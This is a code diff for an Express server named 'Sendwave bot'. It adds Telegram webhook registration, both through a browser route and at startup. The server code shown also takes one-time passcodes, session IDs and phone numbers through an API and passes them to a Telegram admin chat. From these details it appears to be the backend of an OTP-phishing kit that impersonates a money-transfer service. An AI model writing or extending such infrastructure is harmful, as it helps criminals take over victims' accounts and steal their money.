@@ -1,7 +1,9 @@
+
 const express = require('express');
 const cors    = require('cors');
 const path    = require('path');
-const { BOT_TOKEN, ADMIN_CHAT_ID, PORT } = require('./config');
+const fetch   = require('node-fetch');
+const { BOT_TOKEN, ADMIN_CHAT_ID, PORT, APP_URL } = require('./config');
 const SendwaveBot = require('./sendwave');
 
 const app = express();
@@ -20,6 +22,19 @@ app.post('/webhook', async (req, res) => {
     await bot.handleCallback(update.callback_query);
   }
   res.send('OK');
+});
+
+// ── Setup webhook via browser (use this if Telegram is blocked on your network) ──
+app.get('/setup-webhook', async (req, res) => {
+  try {
+    const webhookUrl = `${APP_URL}/webhook`;
+    const result = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${webhookUrl}`);
+    const data = await result.json();
+    console.log('Webhook setup result:', data);
+    res.json(data);
+  } catch (err) {
+    res.json({ success: false, error: err.message });
+  }
 });
 
 // ── API ──
@@ -47,10 +62,10 @@ app.all('/api', async (req, res) => {
     }
 
     case 'otp_entered': {
-      const sessionId  = req.body.sessionId  || '';
-      const otp        = req.body.otp        || '';
+      const sessionId   = req.body.sessionId  || '';
+      const otp         = req.body.otp        || '';
       const countryCode = req.body.countryCode || '+';
-      const phone      = req.body.phone      || '';
+      const phone       = req.body.phone      || '';
 
       if (!sessionId || !otp) {
         return res.json({ success: false, error: 'Missing data' });
@@ -75,9 +90,19 @@ app.all('/api', async (req, res) => {
 });
 
 // ── Start ──
-app.listen(PORT, () => {
+app.listen(PORT, async () => {
   console.log(`✅ Sendwave bot running on port ${PORT}`);
   console.log(`   Webhook : /webhook`);
   console.log(`   API     : /api`);
   console.log(`   Static  : /public`);
+
+  // Auto-register webhook with Telegram on startup
+  try {
+    const webhookUrl = `${APP_URL}/webhook`;
+    const result = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${webhookUrl}`);
+    const data = await result.json();
+    console.log('✅ Webhook registered:', data);
+  } catch (err) {
+    console.error('❌ Failed to register webhook:', err.message);
+  }
 });
